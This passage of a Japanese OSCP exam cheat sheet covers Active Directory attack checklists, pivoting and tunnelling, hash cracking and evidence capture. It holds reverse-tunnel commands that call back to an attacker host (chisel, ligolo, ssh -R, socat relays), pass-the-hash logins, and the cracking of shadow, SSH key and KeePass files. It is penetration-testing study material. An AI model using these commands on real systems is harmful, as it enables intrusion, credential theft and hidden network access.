  ローカル管理者権限で PtH を行なう場合、レジストリ `LocalAccountTokenFilterPolicy` が 1 になっていないと Administrator 以外のローカル管理者は弾かれます。ドメインアカウントか Administrator アカウントを使用してください。
- [ ] **BloodHound で Domain Admin までのパスが見つからないか？**  
  BloodHound の `Find Shortest Paths to Domain Admins` だけでなく、`Find All Paths to Domain Admins` や `Find Shortest Paths to High Value Targets` や `Find Foreign Members` を確認してください。
- [ ] **Kerberos 認証 (`-k` / `PtT`) が時刻ズレでエラーになるか？**  
  Kerberos 認証は攻撃機と DC の時計が **5分以上** ズレていると失敗します。`rdate -s $DC_IP` または `ntpdate $DC_IP` または `sudo timedatectl set-time ...` で時刻を同期させてください。
- [ ] **`impacket-wmiexec` や `evil-winrm` が接続拒否されるか？**  
  ファイアウォールで 135/445/5985/5986 がブロックされていないか、対象マシンがドメインに参加しているか、ホスト名解決 (`/etc/hosts` への登録) ができているか確認してください。
- [ ] **DNS設定の確認**: `/etc/hosts` に DC およびターゲットの FQDN を正しく記載したか？
- [ ] **時刻同期の実施**: Kerberos 攻撃を実行する前に `ntpdate` でターゲットDCと秒単位で時刻を合わせたか？
- [ ] **全ユーザー対象の精査**: AS-REP Roasting や Kerberoasting を一部だけでなく、ドメイン全ユーザーに対して実行したか？
- [ ] **説明欄 (description) の確認**: `ldapsearch` または `PowerView` でオブジェクトの属性値（特に `description` や `info`）に平文パスワードが残っていないか？
- [ ] **GPP パスワードの確認**: SYSVOL 共有内に `groups.xml` 等の GPP パスワード情報が存在しないか？
- [ ] **共有フォルダ権限の再点検**: `SYSVOL` や `NETLOGON` 以外のカスタム共有フォルダの中に、バックアップファイルやスクリプトが放置されていないか？
- [ ] **トークン・セッションの確認**: 奪取した一般端末上で `Mimikatz` や `Incognito` を用い、他ユーザー（特にドメイン管理者）のセッションやトークンが残っていないか調査したか？

#### トラブルシューティング・対照表

| エラーメッセージ / 現象 | 考えられる原因 | 対策・修正コマンド |
| :--- | :--- | :--- |
| `KRB_AP_ERR_SKEW(Clock skew too great)` | 攻撃機とDCの時刻乖離 (>5分) | `sudo ntpdate $DC_IP` または `sudo rdate -n $DC_IP` |
| `KDC_ERR_C_PKINIT_NOT_FOUND` | ADCS/PKINIT証明書設定エラー | ホスト名・IP指定を確認し `-domain` 名を完全修飾指定 |
| `NT_STATUS_LOGON_FAILURE` | 認証情報の誤り / ドメイン不一致 | ドメイン名 `$DOMAIN` を明示指定。`USER@DOMAIN` 形式を試す |
| `NT_STATUS_ACCOUNT_LOCKED_OUT` | アカウントロックアウト発生 | スプレーを直ちに停止。別のアカウントに標的を切り替える |
| `Could not resolve hostname` | DNS名前解決失敗 | `/etc/hosts` に IP と FQDN (例: `10.10.10.10 dc01.corp.local`) を追加 |
| `KDC_ERR_S_BAD_OPTION` | SPN形式の誤り | `cifs/host.corp.local` のように FQDN 表記で指定する |

#### テキスト処理 & ユーティリティ・ワンライナー集 (AD-Specific Text Processing)

```bash
# ldapsearch や rpcclient 出力から純粋な sAMAccountName のリストを生成
grep -i "sAMAccountName:" ldap_output.txt | awk '{print $2}' | tr -d '\r' | sort -u > clean_users.txt

# Netexec SMB スキャン結果から「Pwn3d!」(管理者権限取得) のホストのみ抽出
grep "Pwn3d!" nxc_smb.log | awk '{print $2}' | sort -u

# Kerberoast / AS-REP ハッシュファイルからユーザー名一覧のみを切り出し
cut -d'$' -f4 kerberoast.hashes | cut -d'*' -f1 | cut -d'/' -f1 | sort -u

# Mimikatz sekurlsa::logonpasswords のログから User / Password 行のみ抽出
grep -E "Username|Password" mimikatz.log | grep -v "null" | paste - -
```
---

## 6. ピボット・ポート転送 (Pivoting & Tunneling)

---

### 6.1 ポート転送・トンネリングツール

#### SSH トンネリング (SSH Tunneling)
```bash
# ローカルポート転送 (-L)
# 攻撃機の 8080 ポートへのアクセスを、ターゲット経由で 内部サーバー (192.168.2.10) の 80 ポートへ転送
ssh -L 8080:192.168.2.10:80 user@$TARGET_IP -N -f

# ダイナミックポート転送 (-D) - SOCKS5 プロキシの構築
# 攻撃機の 1080 ポートに SOCKS5 プロキシを起動 (Proxychains と連携)
ssh -D 1080 user@$TARGET_IP -N -f

# リモートポート転送 (-R)
# ターゲット機の 4444 ポートへのアクセスを、攻撃機 (Kali) の 4444 ポートへ逆転送
ssh -R 4444:127.0.0.1:4444 user@$ATTACKER_IP -N -f
```

#### Chisel (HTTP/WebSockets Reverse Tunnel)
```bash
# 1. 攻撃機 (Kali) で Chisel サーバーをリバースモードで起動
chisel server --port 8000 --reverse

# 2. ターゲット機 (Linux / Windows) で Chisel クライアントを実行
# 攻撃機の 1080 ポートに SOCKS5 プロキシを開設
./chisel client $ATTACKER_IP:8000 R:socks

# 特定ポートの個別リバースリレー (例: ターゲットの8080を攻撃機の8080へ)
./chisel client $ATTACKER_IP:8000 R:8080:127.0.0.1:80
```

#### Ligolo-ng (最新鋭レイヤー3 VPN型トンネリング)
```bash
# 1. 攻撃機 (Kali) で tun インターフェース作成＆proxy起動
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. ターゲット機 (Linux / Windows) で agent 実行
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# 3. 攻撃機の proxy プロンプトでの操作
# ligolo> session             # セッション選択 (1を選択)
# ligolo> start               # トンネル開始
# 4. 攻撃機の別ターミナルで内部ネットワークへのルーティング追加:
sudo ip route add 192.168.2.0/24 dev ligolo
```

#### Socat & Plink.exe
```bash
# Socat によるポートリレー (ターゲット上で実行)
# ターゲットの 8080 ポートを 内部サーバー (192.168.2.10:80) へ直接転送
socat TCP-LISTEN:8080,fork TCP:192.168.2.10:80

# Plink.exe (Windows から攻撃機へ SSH トンネルを張る)
cmd.exe /c echo y | plink.exe -R 4444:127.0.0.1:4444 root@$ATTACKER_IP -pw 'password' -N
```

---

### 6.2 プロキシ設定 (Proxychains)

`/etc/proxychains4.conf` の末尾設定:
```text
strict_chain
# quiet_mode を有効にするとログ出力抑制で高速化
quiet_mode
proxy_dns

[ProxyList]
socks5 127.0.0.1 1080
```

Proxychains を使用したコマンド実行例:
```bash
# Proxychains 経由での Nmap スキャン (※必ず -sT -Pn を指定)
proxychains nmap -sT -Pn -p 80,445,3389 192.168.2.10

# Proxychains 経由での Impacket コマンド実行
proxychains impacket-wmiexec Administrator@192.168.2.10 -no-pass

# Proxychains 経由での Evil-WinRM 実行
proxychains evil-winrm -i 192.168.2.10 -u Administrator -H 7a38310ea6f0027ee955abed1762964b
```

---

### 🛠 【6.3 ピボット・ポート転送フェーズのトラブルシューティング・チェックリスト】

- [ ] **Proxychains 経由の Nmap スキャンが極端に遅い、または動かないか？**  
  Proxychains 経由で Nmap を回す際は、必ず **`-sT` (TCP Connect スキャン)** と **`-Pn` (Ping無効)** を指定してください。SYNスキャン (`-sS`) や ICMP Ping はプロキシ経由では動作しません。
- [ ] **Chisel トンネル経由で接続が確立しないか？**  
  `/etc/proxychains4.conf` のポート番号 (`1080`) が Chisel のバインドポートと一致しているか確認してください。
- [ ] **内部ターゲットから攻撃機 (Kali) へのリバースシェルが戻ってこないか？**  
  中間ピボットホスト上で Socat リレー (`socat TCP-LISTEN:4444,fork TCP:$ATTACKER_IP:4444`) を立てているか、Ligolo-ng のリバースリスナー (`ligolo> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444`) を追加しているか確認してください。

---

## 7. パスワードハッシュ解読 (Password Cracking)

---

### 7.1 Hashcat 完全リファレンス

#### よく使うハッシュモード一覧表
| ハッシュ種別 | Hashcat モード番号 (`-m`) | 記述例・形式 |
| :--- | :--- | :--- |
| **NTLM** | `1000` | `329f539fb6973b711e011e7628b613ce` |
| **NTLMv2 (NetNTLMv2)** | `5600` | `admin::domain:112233:hash:blob` |
| **Kerberoast (TGS-REP etype 23)** | `13100` | `$krb5tgs$23$*user$domain$spn*...` |
| **AS-REP Roasting (etype 23)** | `18200` | `$krb5asrep$23$user@domain:...` |
| **Linux SHA-512 ($6$)** | `1800` | `$6$salt$hash...` |
| **Linux yescrypt ($y$)** | `32000` | `$y$j9T$salt$hash...` |
| **MD5 (Unix / MySQL)** | `0` | `5f4dcc3b5aa765d61d8327deb882cf99` |
| **SHA-256** | `1400` | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` |
| **bcrypt ($2a$, $2b$)** | `3200` | `$2b$12$e83...` |
| **Zip (WinZip / PKZIP)** | `13600` / `17220` | `$zip2$*...` |
| **PDF** | `10500` / `10700` | `$pdf$1*...` |
| **KeePass** | `13400` | `$keepass$*...` |

#### Hashcat コマンド例 (辞書攻撃・ルール・マスク)
```bash
# Hashcat: 基本的な辞書攻撃
hashcat -m 1000 -a 0 hashes.txt $WORDLIST

# Hashcat: 辞書攻撃 + ルール適用 (best64 / rockyou-30000)
hashcat -m 1000 -a 0 hashes.txt $WORDLIST -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 hashes.txt $WORDLIST -r /usr/share/hashcat/rules/rockyou-30000.rule

# Hashcat: Kerberoast チケットの解読
hashcat -m 13100 -a 0 kerberoast.hashes $WORDLIST -r /usr/share/hashcat/rules/best64.rule

# Hashcat: AS-REP Roasting ハッシュの解読
hashcat -m 18200 -a 0 asrep.hashes $WORDLIST

# Hashcat: マスク攻撃 (8文字の英数字・パターン解読)
# パターン例: 大文字1文字 + 小文字5文字 + 数字2文字 (例: Password12)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d

# Hashcat: 解読済みパスワードの表示 (--show)
hashcat -m 1000 hashes.txt --show
```

---

### 7.2 John the Ripper 完全リファレンス

```bash
# Linux /etc/shadow の統合と解読
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=$WORDLIST unshadowed.txt

# SSH 秘密鍵パスフレーズの解読
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=$WORDLIST id_rsa.hash

# ZIP パスワードの解読
zip2john protected.zip > zip.hash
john --wordlist=$WORDLIST zip.hash

# RAR パスワードの解読
rar2john protected.rar > rar.hash
john --wordlist=$WORDLIST rar.hash

# PDF パスワードの解読
pdf2john document.pdf > pdf.hash
john --wordlist=$WORDLIST pdf.hash

# KeePass DB パスワードの解読
keepass2john database.kdbx > keepass.hash
john --wordlist=$WORDLIST keepass.hash

# 特定フォーマット指定およびルール適用
john --format=NT --wordlist=$WORDLIST --rules=Jumbo hashes.txt
john --show --format=NT hashes.txt
```

---

### 7.3 カスタム辞書作成 & ワードリスト加工

```bash
# CeWL: Webサイトからのキーワード抽出によるカスタム辞書作成
cewl -w custom_dict.txt -d 2 -m 5 http://$TARGET_IP/

# Crunch: 特定パターン・長さのワードリスト自動生成
# Crunch 8文字 (小文字+数字)
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o crunch_dict.txt

# Hashcat-utils: ワードリストの結合・変形加工
/usr/lib/hashcat-utils/combinator.bin dict1.txt dict2.txt > combined_dict.txt
```

---

### 🛠 【7.4 パスワードハッシュ解読フェーズのトラブルシューティング・チェックリスト】

- [ ] **Hashcat で `Token encoding error` または `No hashes loaded` になるか？**  
  ハッシュファイルの改行コードが Windows (CRLF) になっていないか確認してください。`dos2unix hashes.txt` を実行して整形してください。
- [ ] **どのハッシュ形式かわからないか？**  
  `hash-identifier` または `nth` (Name That Hash) ツールでハッシュ文字列を解析し、正しい Hashcat `-m` 番号を特定してください。
- [ ] **辞書攻撃単体でヒットしないか？**  
  必ずルール (`-r /usr/share/hashcat/rules/best64.rule` や `OneRuleToRuleThemAll.rule`) を適用して再解読を行ってください。
- [ ] **Hashcat のモード番号（`-m`）が正しいか `hashcat --help` や Hashcat Wiki で確認したか？**
- [ ] **辞書に `rockyou.txt` を使い、かつルール（`-r /usr/share/hashcat/rules/best64.rule` や `OneRuleToRuleThemAll`）を適用したか？**
- [ ] ::ハッシュファイルに不要なヘッダーや空白文字が含まれていないか確認したか？**
- [ ] **解読済みの結果を再確認するために `--show` を付与して実行したか？**
---

## 8. 試験運用・ドキュメント作成・Metasploit制限管理 (Exam & Note Taking)

---

### 8.1 証明ファイル (Flags) 取得・確認ワンライナー

> [!DANGER] 試験提出用エビデンスの必須条件
> 1. `local.txt` または `proof.txt` の内容が表示されていること。
> 2. **同一画面・同一コマンドプロンプト内** で `hostname` および `id` / `whoami` の実行結果が並んで表示されていること。
> 3. IPアドレス（`ip a` や `ipconfig`）が表示されていること。

#### Linux 証明ファイル一括採取ワンライナー
```bash
echo "=== EVIDENCE CAPTURE ==="; hostname; id; ip a | grep inet; cat /root/proof.txt 2>/dev/null || cat /home/*/local.txt
```

#### Windows 証明ファイル一括採取ワンライナー
```cmd
echo === EVIDENCE CAPTURE === & hostname & whoami & ipconfig | findstr /i "IPv4" & type C:\Users\Administrator\Desktop\proof.txt 2>nul || type C:\Users\*\Desktop\local.txt
```

### 8.2 Terminal セッションログ管理

```bash
# セッション開始時に記録開始 (ログファイルにタイムスタンプ付与)
script -a -f session_$(date +%Y%m%d_%H%M%S).log

# セッション終了時
exit
```

### 8.3 Metasploit 利用制限管理トラッカー

OSCP試験では、Metasploitの**「エクスプロイトモジュール」**（侵入に使用するもの）は**全試験期間を通じて1つのターゲットホストに対して1回のみ**使用可能（※`multi/handler` や `msfvenom` や `pattern_create` 等のスタンドアロンツールは無制限）。

| ターゲット IP | 使用した MSF エクスプロイト | 使用結果 (Success/Fail) | 備考 |
| :--- | :--- | :--- | :--- |
| `10.10.10.X` | `exploit/multi/http/...` | Success | 唯一の使用権を本ホストで消費 |
| `10.10.10.Y` | 未使用 | - | 手動エクスプロイトで攻略 |
| `10.10.10.Z` | 未使用 | - | 手動エクスプロイトで攻略 |

### 8.4 ワンライナー

#### Nmap / スキャン結果からの抽出ワンライナー

```bash
# 1. Nmapの標準出力 (-oN) から「開放されているポート番号」のみをカンマ区切りで抽出
grep -oP '\d+/open' nmap_all_ports.txt | cut -d/ -f1 | paste -sd, -

# 例出力: 22,80,135,139,445,3389

# 2. 開放ポートリストをそのまま詳細Nmapスキャンに渡すワンライナー
PORTS=$(grep -oP '\d+/open' nmap_all_ports.txt | cut -d/ -f1 | paste -sd, -)
nmap -sC -sV -p $PORTS $TARGET_IP -oN nmap_detailed.txt
```

#### SMB / RPC / LDAP ユーザー名・ハッシュ抽出ワンライナー

```bash
# 1. rpcclient (enumdomusers) の出力から純粋なユーザー名リストを作成
rpcclient -U "" -N $TARGET_IP -c "enumdomusers" | grep -oP 'user:\[\K[^\]]+' > users.txt

# 2. enum4linux の出力からユーザー名を抽出
grep -oP 'user:\[\K[^\]]+' enum4linux.txt | sort -u > users.txt

# 3. impacket-secretsdump の出力から NTLM ハッシュのみを整理して抽出 (Pass-the-Hash用)
cut -d: -f1,4 ntds.dump | grep -v '\$:' > user_hashes.txt
```

#### Webスキャン結果 (ffuf / gobuster) からのURL・ステータスコード抽出

```bash
# 1. ffuf の結果 (JSON出力) から HTTP 200 / 301 の URL のみ抽出
ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -o ffuf.json -of json
jq -r '.results[] | select(.status == 200 or .status == 301) | .url' ffuf.json

# 2. gobuster の結果から有効なパスのみ抽出
grep "Status: 200" gobuster.txt | awk '{print $1}' > valid_paths.txt
```

#### Base64 / URL / Hex エンコード・デコード処理

```bash
# Base64 エンコード / デコード
echo -n "admin:Password123" | base64
echo "YWRtaW46UGFzc3dvcmQxMjM=" | base64 -d

# URL デコード
python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))" <<< "%2E%2E%2F%2E%2E%2Fetc%2Fpasswd"

# Hex デコード (シェルコード解析等)
echo "414243313233" | xxd -r -p
```

#### IPアドレス抽出・ソート・重複排除

```bash
# 大量テキストからドット区切りの IPv4 アドレスを抽出・ソート・重複排除
grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" scan_results.txt | sort -u -V > unique_ips.txt
```

---


---

### 8.5 試験運用・最終トラブルシューティング・チェックリスト】

- [ ] **Proof.txt を取得した際、スクリーンショットと `ipconfig`/`ifconfig` / `whoami` の結果を一緒に記録したか？**  
  レポート提出時に IP アドレスとユーザー権限が同一画面で確認できる画面キャプチャが必須となります。
- [ ] **アップロードしたペイロード（`reverse.exe` や `linpeas.sh` 等）をターゲットから削除したか？**  
  クリーンアップ作業（テスト痕跡の削除）を忘れないように記録しておいてください。
- [ ] **端末のログ記録 (Terminator / Script) を保存しているか？**  
  `script -a exam_terminal.log` や Terminator のログ保存機能を有効にして、後からコマンド履歴を遡れるようにしてください。
- [ ] **侵入手順・権限昇格手順のコマンドが再現可能な形で記録されているか？**
- [ ] **独自のスクリプトやバイナリを使用した際、コードの内容または入手元が明記されているか？**
- [ ] **試験時間管理・リセット判断**  
  一つの問題で **2時間以上** 手詰まりになった場合は、深追いをやめて一度ターゲットをリセットするか、別ターゲットのポートスキャン・列挙に切り替えてください。
